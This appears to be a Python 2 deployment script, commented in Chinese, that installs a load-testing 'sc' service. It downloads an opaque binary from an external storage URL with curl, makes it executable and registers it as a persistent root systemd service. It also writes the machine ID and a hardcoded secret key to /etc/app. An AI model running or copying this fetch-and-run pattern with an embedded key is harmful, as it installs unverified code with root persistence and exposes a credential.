#!/usr/bin/python2
# -*- coding: utf-8 -*-
# 压测服务部署脚本（Python2 版本）

import subprocess
import sys
import os
import json
import shutil

def run_cmd(cmd):
    p = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    out, _ = p.communicate()
    if p.returncode != 0:
        raise RuntimeError(out)
    return out

def get_mac_id():
    mac_file = "/etc/machine-id"
    with open(mac_file, "r") as f:
        return f.read().strip()

#=======部署压测环境===========
def install_base():
    mac = get_mac_id()
    sk = "de8ca01235821ee0e9bcceecf8876ca919e319dbac2f85c7589fae32b78d9e7b"
    url = "https://ss.bscstorage.com/recruit-lixiaodong/mx/701/sc-v1.0.2"
    sperfs_addr = "https://sperfs.9yb.life"

    # 停止并禁用服务（允许不存在）
    try:
        run_cmd("systemctl stop sc.service")
        run_cmd("systemctl disable sc.service")
    except Exception:
        pass

    # 删除旧目录
    if os.path.exists("/usr/local/sc"):
        shutil.rmtree("/usr/local/sc")

    if not os.path.exists("/etc/app"):
        os.makedirs("/etc/app")
    if not os.path.exists("/usr/local/sc"):
        os.makedirs("/usr/local/sc")

    with open("/etc/app/.sn", "w") as f:
        f.write(mac)

    with open("/etc/app/.sk", "w") as f:
        f.write(sk)

    with open("/usr/local/sc/sperfs_addr", "w") as f:
        f.write(sperfs_addr)

    # 下载 sc 程序
    cmd = (
        "curl -fL --retry 3 -o /usr/local/sc/sc %s "
        "&& chmod +x /usr/local/sc/sc"
    ) % url
    run_cmd(cmd)

    # systemd service
    service_info = """[Unit]
Description=sc server
After=network.target

[Service]
WorkingDirectory=/usr/local/sc
ExecStart=/usr/local/sc/sc -s -log=true
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
    with open("/etc/systemd/system/sc.service", "w") as f:
        f.write(service_info)

    run_cmd("systemctl daemon-reload")
    run_cmd("systemctl enable sc.service")
    run_cmd("systemctl restart sc.service")

    status = run_cmd("systemctl is-active sc.service").strip()
    return 0 if status == "active" else 1

if __name__ == "__main__":
    try:
        result_code = install_base()
        if result_code == 0:
            result = {"status": "success", "message": "sc服务安装并启动成功"}
        else:
            result = {"status": "failure", "message": "sc服务启动失败"}
    except Exception as e:
        result = {"status": "failure", "message": str(e)}

    print(json.dumps(result, ensure_ascii=False))
